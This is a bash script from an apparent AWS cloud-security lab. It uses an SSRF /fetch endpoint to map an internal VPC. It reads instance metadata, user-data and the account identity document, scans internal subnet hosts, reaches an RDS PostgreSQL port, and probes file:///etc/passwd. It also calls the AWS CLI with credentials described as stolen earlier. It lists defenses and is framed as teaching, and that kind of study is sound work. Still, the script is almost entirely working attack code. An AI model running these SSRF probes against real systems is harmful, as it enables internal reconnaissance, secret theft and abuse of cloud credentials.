#!/usr/bin/env bash
# =============================================================================
# 10_ssrf_internal_recon.sh — SSRF-based internal VPC reconnaissance
# =============================================================================
# Purpose:
#   Exploit SSRF vulnerabilities to explore the internal VPC network topology.
#   Collect internal network information invisible from outside and identify attack targets.
#
# Learning points:
#   - SSRF can be used not only for metadata theft but also for internal network reconnaissance
#   - VPC CIDR, subnet layout, and internal host liveness can be discovered
#   - Error messages may leak internal software stack information
#   - Network info obtained from IMDS helps determine the attack scope
#   - RDS blocked from external access may still be TCP-reachable via SSRF
#
# Test contents:
#   1. Retrieve VPC network info from IMDS (CIDR, subnet, MAC)
#   2. Exfiltrate user-data (startup script)
#   3. Instance identity document (account ID, region, etc.)
#   4. Internal subnet scan (gateway and host liveness check)
#   5. RDS endpoint reachability via SSRF
#   6. VPC DNS resolver probe
#   7. Error-based information gathering (protocol, IPv6, internal IPs)
#   8. Summary (aggregate findings)
#
# Defenses:
#   - Enforce IMDSv2 (http_tokens = "required")
#   - Remove the /fetch endpoint or implement URL allowlisting
#   - Block internal IP address patterns with WAF
#   - Strip internal information from error messages
#   - Monitor anomalous internal traffic with VPC Flow Logs
# =============================================================================

set -euo pipefail

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
source "${SCRIPT_DIR}/_common.sh"

init_config

print_header "10: SSRF Internal VPC Reconnaissance (SSRF -> Network Mapping)"

RESULT_FILE="10_ssrf_internal_recon.txt"
result_text=""
TARGET_URL="http://${ATTACK_TARGET}"
IMDS_BASE="http://169.254.169.254"

echo -e "${BLUE}[*] Target URL: ${TARGET_URL}${NC}"
echo -e "${BLUE}[*] Using SSRF to map internal VPC topology${NC}"
echo ""

# Findings counters
vuln_count=0
blocked_count=0
info_count=0

# ---------------------------------------------------------------------------
# Step 1: Retrieve VPC network info from IMDS
# ---------------------------------------------------------------------------
# Obtain VPC ID, CIDR, and subnet info via the network interface MAC address.
# Attackers first map the network layout to determine the scan target range.
# ---------------------------------------------------------------------------
print_header "Step 1: VPC Network Info via IMDS"
echo -e "${BLUE}[*] Retrieving network interface MAC address via SSRF${NC}"
echo ""

result_text+="=== Step 1: VPC Network Info via IMDS ==="$'\n'

# Retrieve MAC address (serves as the key for network info lookups)
mac_response=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/network/interfaces/macs/" 2>&1) || mac_response=""

vpc_id=""
vpc_cidr=""
subnet_cidr=""
subnet_id=""

if [[ -n "${mac_response}" ]] && echo "${mac_response}" | grep -qE "^[0-9a-f]{2}:"; then
    # Extract MAC address (strip trailing slash)
    mac_addr=$(echo "${mac_response}" | head -1 | tr -d '/')
    echo -e "  MAC Address: ${mac_addr}"
    result_text+="MAC Address: ${mac_addr}"$'\n'

    # Retrieve VPC info using the MAC address as the lookup key
    vpc_id=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/network/interfaces/macs/${mac_addr}/vpc-id" 2>/dev/null) || vpc_id=""
    vpc_cidr=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/network/interfaces/macs/${mac_addr}/vpc-ipv4-cidr-block" 2>/dev/null) || vpc_cidr=""
    subnet_cidr=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/network/interfaces/macs/${mac_addr}/subnet-ipv4-cidr-block" 2>/dev/null) || subnet_cidr=""
    subnet_id=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/network/interfaces/macs/${mac_addr}/subnet-id" 2>/dev/null) || subnet_id=""

    echo -e "  VPC ID:          ${vpc_id}"
    echo -e "  VPC CIDR:        ${vpc_cidr}"
    echo -e "  Subnet CIDR:     ${subnet_cidr}"
    echo -e "  Subnet ID:       ${subnet_id}"

    result_text+="VPC ID: ${vpc_id}"$'\n'
    result_text+="VPC CIDR: ${vpc_cidr}"$'\n'
    result_text+="Subnet CIDR: ${subnet_cidr}"$'\n'
    result_text+="Subnet ID: ${subnet_id}"$'\n'

    if [[ -n "${vpc_cidr}" ]]; then
        print_vulnerable "VPC network topology leaked — Attacker can map internal network"
        result_text+="Verdict: VULNERABLE — VPC CIDR leaked"$'\n'
        vuln_count=$((vuln_count + 1))
    else
        print_blocked "VPC CIDR not retrievable"
        result_text+="Verdict: BLOCKED — VPC CIDR not retrieved"$'\n'
        blocked_count=$((blocked_count + 1))
    fi
else
    echo -e "  MAC address retrieval: Failed"
    echo -e "  Response: ${mac_response:0:200}"
    result_text+="MAC address: Failed to retrieve"$'\n'

    if echo "${mac_response}" | grep -qi "401\|Token required\|unauthorized"; then
        print_blocked "IMDSv2 enforced — Network info not accessible via SSRF"
        result_text+="Verdict: BLOCKED — IMDSv2 enforced"$'\n'
        blocked_count=$((blocked_count + 1))
    else
        print_info "Failed to reach IMDS network interface endpoint"
        result_text+="Verdict: Unknown — IMDS unreachable"$'\n'
        info_count=$((info_count + 1))
    fi
fi

echo ""

# ---------------------------------------------------------------------------
# Step 2: Exfiltrate user-data (startup script)
# ---------------------------------------------------------------------------
# EC2 user-data often contains deployment scripts.
# In production, DB connection strings, API keys, and passwords may be stored in plaintext.
# ---------------------------------------------------------------------------
print_header "Step 2: User-Data Exfiltration"
echo -e "${BLUE}[*] Retrieving EC2 user-data (startup script) via SSRF${NC}"
echo -e "${BLUE}[*] In production, user-data often contains DB connection strings and API keys${NC}"
echo ""

result_text+=$'\n'"=== Step 2: User-Data Exfiltration ==="$'\n'

userdata=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/user-data" 2>/dev/null) || userdata=""

if [[ -n "${userdata}" ]] && echo "${userdata}" | grep -qiE "pip install|flask|systemd|#!/"; then
    echo -e "${RED}  Deployment script content retrieved:${NC}"
    echo "${userdata}" | head -40
    result_text+="--- User-Data Content ---"$'\n'
    result_text+="${userdata}"$'\n'
    print_vulnerable "User-data leaked — Contains deployment script with potential secrets"
    print_info "In production, user-data often contains DB connection strings, API keys, and passwords"
    result_text+="Verdict: VULNERABLE — Deployment script leaked"$'\n'
    vuln_count=$((vuln_count + 1))
elif [[ -n "${userdata}" ]] && ! echo "${userdata}" | grep -qi "404\|not found"; then
    echo -e "${YELLOW}  User-data retrieved (unexpected format):${NC}"
    echo "${userdata}" | head -20
    result_text+="User-data: Retrieved (non-standard format)"$'\n'
    result_text+="${userdata}"$'\n'
    print_info "User-data retrieved but does not match expected deployment script"
    info_count=$((info_count + 1))
else
    echo -e "  User-data: Not retrievable"
    result_text+="User-data: Not retrievable"$'\n'
    print_blocked "User-data not accessible"
    blocked_count=$((blocked_count + 1))
fi

echo ""

# ---------------------------------------------------------------------------
# Step 3: Instance identity document (account info exfiltration)
# ---------------------------------------------------------------------------
# instance-identity/document contains the AWS account ID, region, and instance type.
# The account ID serves as a starting point for IAM policy guessing and cross-account attacks.
# ---------------------------------------------------------------------------
print_header "Step 3: Instance Identity Document"
echo -e "${BLUE}[*] Retrieving instance identity document via SSRF${NC}"
echo -e "${BLUE}[*] AWS account ID and region info serve as a starting point for lateral movement${NC}"
echo ""

result_text+=$'\n'"=== Step 3: Instance Identity Document ==="$'\n'

identity_doc=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/dynamic/instance-identity/document" 2>/dev/null) || identity_doc=""

if [[ -n "${identity_doc}" ]] && echo "${identity_doc}" | grep -qi "accountId"; then
    echo -e "${RED}  Instance identity document retrieved:${NC}"
    echo ""

    # Parse JSON and extract key fields
    echo "${identity_doc}" | python3 -c "
import json, sys
try:
    d = json.load(sys.stdin)
    print(f\"  Account ID:     {d.get('accountId', 'N/A')}\")
    print(f\"  Region:         {d.get('region', 'N/A')}\")
    print(f\"  Instance ID:    {d.get('instanceId', 'N/A')}\")
    print(f\"  Image ID:       {d.get('imageId', 'N/A')}\")
    print(f\"  Instance Type:  {d.get('instanceType', 'N/A')}\")
except:
    print(sys.stdin.read()[:500])
" 2>/dev/null || echo "${identity_doc}" | head -15

    result_text+="--- Identity Document ---"$'\n'
    result_text+="${identity_doc}"$'\n'
    print_vulnerable "AWS account info leaked — Enables cross-account attack planning"
    result_text+="Verdict: VULNERABLE — Account info leaked"$'\n'
    vuln_count=$((vuln_count + 1))
else
    echo -e "  Identity document: Not retrievable"
    result_text+="Identity document: Not retrievable"$'\n'
    print_blocked "Instance identity document not accessible"
    blocked_count=$((blocked_count + 1))
fi

echo ""

# ---------------------------------------------------------------------------
# Step 4: Internal subnet scan (host liveness check via SSRF)
# ---------------------------------------------------------------------------
# Using the VPC CIDR from Step 1, scan gateway IPs and hosts in each subnet.
# Host state is inferred from the response type (reply, connection refused, timeout).
# Timeout = no host, connection refused = host exists (port closed), reply = service running
# ---------------------------------------------------------------------------
print_header "Step 4: Internal Subnet Scanning via SSRF"
echo -e "${BLUE}[*] Scanning internal subnet hosts via SSRF proxy${NC}"
echo -e "${BLUE}[*] Inferring internal host liveness from response patterns${NC}"
echo ""

result_text+=$'\n'"=== Step 4: Internal Subnet Scanning ==="$'\n'

# Target IPs (common subnet layout for Terraform VPCs)
# Gateway IPs (.1) are useful for confirming subnet existence
declare -a scan_targets=(
    "10.0.1.1:Public Subnet Gateway"
    "10.0.10.1:App Private Subnet Gateway"
    "10.0.20.1:DB Private Subnet Gateway"
    "10.0.1.10:Public Subnet Host"
    "10.0.1.50:Public Subnet Host"
    "10.0.10.10:App Private Subnet Host"
    "10.0.10.50:App Private Subnet Host"
    "10.0.20.10:DB Private Subnet Host"
    "10.0.20.50:DB Private Subnet Host"
)

alive_hosts=()
step4_vuln=false

for entry in "${scan_targets[@]}"; do
    ip="${entry%%:*}"
    label="${entry##*:}"
    scan_url="http://${ip}:80/"

    echo -ne "  Scanning ${ip} (${label})... "

    # Send HTTP request to internal IP via SSRF (3-second timeout)
    response=$(curl -sS -m 3 -o /dev/null -w "%{http_code}|%{time_total}" \
        "${TARGET_URL}/fetch?url=${scan_url}" 2>&1) || response="000|timeout"

    http_code="${response%%|*}"
    time_total="${response##*|}"

    if [[ "${http_code}" == "000" ]]; then
        # Timeout: no host present or filtered
        echo -e "${GREEN}Timeout (no host or filtered)${NC}"
        result_text+="${ip} (${label}): Timeout — No host or filtered"$'\n'
    elif [[ "${http_code}" == "200" ]]; then
        # HTTP 200: service responded (host confirmed alive, service running)
        echo -e "${RED}HTTP ${http_code} — Host alive, service running!${NC}"
        result_text+="${ip} (${label}): HTTP ${http_code} — ALIVE (service running)"$'\n'
        alive_hosts+=("${ip} (${label})")
        step4_vuln=true
    else
        # Other HTTP codes: host likely exists (connection was established)
        echo -e "${YELLOW}HTTP ${http_code} — Host likely exists (${time_total}s)${NC}"
        result_text+="${ip} (${label}): HTTP ${http_code} — Host likely exists"$'\n'
        alive_hosts+=("${ip} (${label})")
        step4_vuln=true
    fi
done

echo ""

if [[ "${step4_vuln}" == true ]]; then
    print_vulnerable "Internal hosts reachable via SSRF — Network segmentation bypassed"
    echo -e "  Discovered hosts:"
    for h in "${alive_hosts[@]}"; do
        echo -e "    - ${h}"
    done
    result_text+="Verdict: VULNERABLE — ${#alive_hosts[@]} internal hosts reachable"$'\n'
    vuln_count=$((vuln_count + 1))
else
    print_blocked "No internal hosts reachable via SSRF"
    result_text+="Verdict: BLOCKED — No internal hosts responded"$'\n'
    blocked_count=$((blocked_count + 1))
fi

echo ""

# ---------------------------------------------------------------------------
# Step 5: RDS endpoint reachability via SSRF
# ---------------------------------------------------------------------------
# Even when direct external connections to RDS are blocked, exploiting an SSRF
# vulnerability on EC2 may allow TCP reachability. This demonstrates that RDS
# blocked externally in Script 05 can be reached via SSRF.
# ---------------------------------------------------------------------------
print_header "Step 5: RDS Endpoint Reachability via SSRF"
echo -e "${BLUE}[*] Testing if RDS is reachable from EC2 context via SSRF${NC}"
echo -e "${BLUE}[*] Testing RDS via SSRF — this was blocked from external access in Script 05${NC}"
echo ""

result_text+=$'\n'"=== Step 5: RDS Reachability via SSRF ==="$'\n'

rds_host=""

# First, attempt to discover RDS endpoint using previously stolen credentials
# (if credentials obtained in 04_ssrf_metadata.sh are present in environment variables)
if [[ -n "${AWS_ACCESS_KEY_ID:-}" ]] && [[ -n "${AWS_SECRET_ACCESS_KEY:-}" ]]; then
    echo -e "${BLUE}[*] Attempting to discover RDS endpoint using stolen credentials${NC}"
    rds_describe=$(aws rds describe-db-instances --query 'DBInstances[0].Endpoint.Address' --output text 2>/dev/null) || rds_describe=""
    if [[ -n "${rds_describe}" ]] && [[ "${rds_describe}" != "None" ]]; then
        rds_host="${rds_describe}"
        echo -e "  RDS endpoint from stolen creds: ${rds_host}"
        result_text+="RDS endpoint (from stolen creds): ${rds_host}"$'\n'
    fi
fi

# Fallback: retrieve from Terraform output (for demo purposes)
if [[ -z "${rds_host}" ]]; then
    rds_host=$(parse_rds_host)
    if [[ -n "${rds_host}" ]]; then
        echo -e "  RDS endpoint (from terraform): ${rds_host}"
        result_text+="RDS endpoint (from terraform): ${rds_host}"$'\n'
    fi
fi

if [[ -n "${rds_host}" ]]; then
    # Send HTTP request to RDS PostgreSQL port via SSRF
    # PostgreSQL returns an error for HTTP requests, but this proves TCP reachability
    rds_ssrf_url="http://${rds_host}:5432/"
    echo -e "${BLUE}[*] SSRF -> ${rds_ssrf_url}${NC}"

    rds_response=$(curl -sS -m 5 "${TARGET_URL}/fetch?url=${rds_ssrf_url}" 2>&1) || rds_response=""

    result_text+="--- RDS SSRF Response ---"$'\n'
    result_text+="${rds_response:0:500}"$'\n'

    if echo "${rds_response}" | grep -qiE "postgres|pgbouncer|invalid packet|SSL|FATAL|authentication"; then
        print_vulnerable "RDS reachable via SSRF — PostgreSQL protocol response detected"
        print_info "External access was BLOCKED (script 05) but SSRF bypasses network controls"
        print_info "EC2 -> RDS is allowed by Security Group, SSRF exploits this trust"
        result_text+="Verdict: VULNERABLE — RDS reachable via SSRF (external=BLOCKED, SSRF=reachable)"$'\n'
        vuln_count=$((vuln_count + 1))
    elif [[ -n "${rds_response}" ]] && ! echo "${rds_response}" | grep -qi "timed out\|timeout\|refused"; then
        print_vulnerable "RDS responded via SSRF — Some TCP connectivity confirmed"
        echo -e "  Response (first 200 chars): ${rds_response:0:200}"
        result_text+="Verdict: VULNERABLE — RDS responded (non-PostgreSQL)"$'\n'
        vuln_count=$((vuln_count + 1))
    else
        print_blocked "RDS not reachable via SSRF"
        echo -e "  Response: ${rds_response:0:200}"
        result_text+="Verdict: BLOCKED — RDS not reachable via SSRF"$'\n'
        blocked_count=$((blocked_count + 1))
    fi
else
    echo -e "  RDS endpoint: Not available"
    result_text+="RDS endpoint: Not available"$'\n'
    print_info "RDS endpoint not found — Skipping SSRF reachability test"
    info_count=$((info_count + 1))
fi

echo ""

# ---------------------------------------------------------------------------
# Step 6: VPC DNS resolver probe
# ---------------------------------------------------------------------------
# 169.254.169.253 is the VPC internal DNS resolver (Amazon Provided DNS).
# Verify reachability to this address and explore DNS-based information gathering.
# ---------------------------------------------------------------------------
print_header "Step 6: VPC DNS Resolver Probe"
echo -e "${BLUE}[*] Probing VPC DNS resolver and AWS service domain${NC}"
echo ""

result_text+=$'\n'"=== Step 6: VPC DNS Resolver Probe ==="$'\n'

# VPC DNS resolver (169.254.169.253)
echo -e "  [*] Probing VPC DNS resolver (169.254.169.253)..."
dns_resolver_response=$(curl -sS -m 3 "${TARGET_URL}/fetch?url=http://169.254.169.253/" 2>&1) || dns_resolver_response=""

if [[ -n "${dns_resolver_response}" ]]; then
    echo -e "  Response (first 200 chars): ${dns_resolver_response:0:200}"
    result_text+="VPC DNS (169.254.169.253): ${dns_resolver_response:0:300}"$'\n'
    print_info "VPC DNS resolver responded — DNS-based reconnaissance possible"
    info_count=$((info_count + 1))
else
    echo -e "  VPC DNS resolver: No response"
    result_text+="VPC DNS (169.254.169.253): No response"$'\n'
fi

echo ""

# AWS service domain info
echo -e "  [*] Retrieving AWS service domain..."
aws_domain=$(curl -sS -m 3 "${TARGET_URL}/fetch?url=${IMDS_BASE}/latest/meta-data/services/domain" 2>/dev/null) || aws_domain=""

if [[ -n "${aws_domain}" ]]; then
    echo -e "  AWS Domain: ${aws_domain}"
    result_text+="AWS Domain: ${aws_domain}"$'\n'
    print_info "AWS service domain retrieved: ${aws_domain}"
    info_count=$((info_count + 1))
else
    echo -e "  AWS Domain: Not retrievable"
    result_text+="AWS Domain: Not retrievable"$'\n'
fi

echo ""

# ---------------------------------------------------------------------------
# Step 7: Error-based information gathering
# ---------------------------------------------------------------------------
# Try various URLs and protocols to extract internal info from error messages.
# Error messages may reveal Python version, library names, and internal IP state.
# Information leakage is itself a vulnerability that increases attack precision.
# ---------------------------------------------------------------------------
print_header "Step 7: Error-Based Information Gathering"
echo -e "${BLUE}[*] Testing various URLs to extract info from error messages${NC}"
echo -e "${BLUE}[*] Error messages may leak software stack information${NC}"
echo ""

result_text+=$'\n'"=== Step 7: Error-Based Information Gathering ==="$'\n'

declare -a error_probes=(
    "file:///etc/passwd:file:// protocol (local file read)"
    "http://[::1]:80/:IPv6 loopback"
    "http://10.0.20.5:5432/:Random DB subnet IP"
    "http://10.0.10.99:80/:Random App subnet IP"
)

step7_leaks=0

for entry in "${error_probes[@]}"; do
    probe_url="${entry%%:*}:${entry#*:}"
    # Re-split: first field before the second colon-pair is the URL
    probe_url=$(echo "${entry}" | cut -d':' -f1-2)
    probe_label=$(echo "${entry}" | cut -d':' -f3-)

    echo -e "  [*] Testing: ${probe_label} (${probe_url})"

    # URL-encoding required for certain cases (file:// and IPv6)
    encoded_url=$(python3 -c "import urllib.parse; print(urllib.parse.quote('${probe_url}', safe=''))" 2>/dev/null) || encoded_url="${probe_url}"

    error_response=$(curl -sS -m 3 "${TARGET_URL}/fetch?url=${encoded_url}" 2>&1) || error_response=""

    result_text+="--- Probe: ${probe_label} (${probe_url}) ---"$'\n'
    result_text+="${error_response:0:500}"$'\n'

    if [[ -n "${error_response}" ]]; then
        # Check for information leakage indicators
        leaked_info=""

        if echo "${error_response}" | grep -qiE "python|flask|werkzeug|urllib|requests"; then
            leaked_info+="Python/Flask stack info, "
        fi
        if echo "${error_response}" | grep -qiE "traceback|exception|error.*line [0-9]"; then
            leaked_info+="Stack trace, "
        fi
        if echo "${error_response}" | grep -qiE "No route to host|Connection refused|Network unreachable"; then
            leaked_info+="Network state info, "
        fi
        if echo "${error_response}" | grep -qiE "root:|/bin/bash|/usr/sbin"; then
            leaked_info+="Local file contents, "
        fi
        if echo "${error_response}" | grep -qiE "10\\.0\\.[0-9]+\\.[0-9]+|172\\.(1[6-9]|2[0-9]|3[01])\\.|192\\.168\\."; then
            leaked_info+="Internal IP addresses, "
        fi

        if [[ -n "${leaked_info}" ]]; then
            leaked_info="${leaked_info%, }"
            echo -e "    ${RED}Leaked: ${leaked_info}${NC}"
            result_text+="Leaked: ${leaked_info}"$'\n'
            step7_leaks=$((step7_leaks + 1))
        else
            echo -e "    ${YELLOW}Response received but no obvious leakage${NC}"
            echo -e "    (first 150 chars): ${error_response:0:150}"
        fi
    else
        echo -e "    ${GREEN}No response (timeout or blocked)${NC}"
    fi
    echo ""
done

if [[ ${step7_leaks} -gt 0 ]]; then
    print_vulnerable "Error messages leak internal info — ${step7_leaks} probes revealed information"
    result_text+="Verdict: VULNERABLE — ${step7_leaks} error-based information leaks"$'\n'
    vuln_count=$((vuln_count + 1))
else
    print_blocked "Error messages do not reveal sensitive information"
    result_text+="Verdict: BLOCKED — No error-based leakage detected"$'\n'
    blocked_count=$((blocked_count + 1))
fi

echo ""

# ---------------------------------------------------------------------------
# Step 8: Summary (aggregate findings)
# ---------------------------------------------------------------------------
print_header "Step 8: Reconnaissance Summary"

result_text+=$'\n'"=== Step 8: Reconnaissance Summary ==="$'\n'

echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo -e "${BOLD}  SSRF Internal Recon Summary (${CONFIG_LABEL})${NC}"
echo -e "${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${NC}"
echo ""

echo -e "  ${RED}Vulnerabilities found: ${vuln_count}${NC}"
echo -e "  ${GREEN}Tests blocked:         ${blocked_count}${NC}"
echo -e "  ${BLUE}Info gathered:         ${info_count}${NC}"
echo ""

result_text+="Total VULNERABLE: ${vuln_count}"$'\n'
result_text+="Total BLOCKED: ${blocked_count}"$'\n'
result_text+="Total INFO: ${info_count}"$'\n'

# Discovered VPC topology findings
echo -e "${BOLD}  Discovered VPC Topology:${NC}"
result_text+=$'\n'"--- Discovered VPC Topology ---"$'\n'

if [[ -n "${vpc_cidr}" ]]; then
    echo -e "    VPC CIDR:    ${vpc_cidr}"
    result_text+="VPC CIDR: ${vpc_cidr}"$'\n'
fi
if [[ -n "${subnet_cidr}" ]]; then
    echo -e "    Subnet CIDR: ${subnet_cidr}"
    result_text+="Subnet CIDR: ${subnet_cidr}"$'\n'
fi
if [[ ${#alive_hosts[@]} -gt 0 ]]; then
    echo -e "    Reachable internal hosts:"
    for h in "${alive_hosts[@]}"; do
        echo -e "      - ${h}"
        result_text+="Reachable: ${h}"$'\n'
    done
fi

echo ""

# Reachable services
echo -e "${BOLD}  Reachable Internal Services:${NC}"
result_text+=$'\n'"--- Reachable Services ---"$'\n'

if [[ -n "${rds_host}" ]]; then
    echo -e "    - RDS (PostgreSQL): ${rds_host}:5432 via SSRF"
    result_text+="RDS: ${rds_host}:5432 (via SSRF)"$'\n'
fi
echo -e "    - IMDS: 169.254.169.254 (metadata service)"
result_text+="IMDS: 169.254.169.254"$'\n'

echo ""

# Config A/B comparative analysis
if [[ "${CONFIG_MODE}" == "public" ]]; then
    echo -e "${BLUE}  Config A Analysis:${NC}"
    echo -e "    - EC2 is directly exposed to the internet, making it an easy SSRF entry point"
    echo -e "    - Full internal VPC mapping is possible via SSRF"
    echo -e "    - SSRF access to RDS bypasses external direct connection restrictions"
    echo -e "    - Defenses: Enforce IMDSv2, remove /fetch, inspect URLs with WAF"
    result_text+=$'\n'"Config A: EC2 directly exposed, full VPC reconnaissance possible via SSRF"$'\n'
else
    echo -e "${BLUE}  Config B Analysis:${NC}"
    echo -e "    - Access is only through ALB, but SSRF is an application-layer vulnerability and cannot be prevented by ALB"
    echo -e "    - ALB forwards HTTP requests, so the /fetch endpoint is also forwarded"
    echo -e "    - Config B network isolation has limited effectiveness against SSRF attacks"
    echo -e "    - Defenses: URL pattern filtering with WAF, application-layer mitigations are essential"
    result_text+=$'\n'"Config B: ALB provides limited protection against SSRF-based recon"$'\n'
fi

echo ""

# ---------------------------------------------------------------------------
# Save results
# ---------------------------------------------------------------------------
save_result "${RESULT_FILE}" "${result_text}"

log "SSRF internal reconnaissance complete"
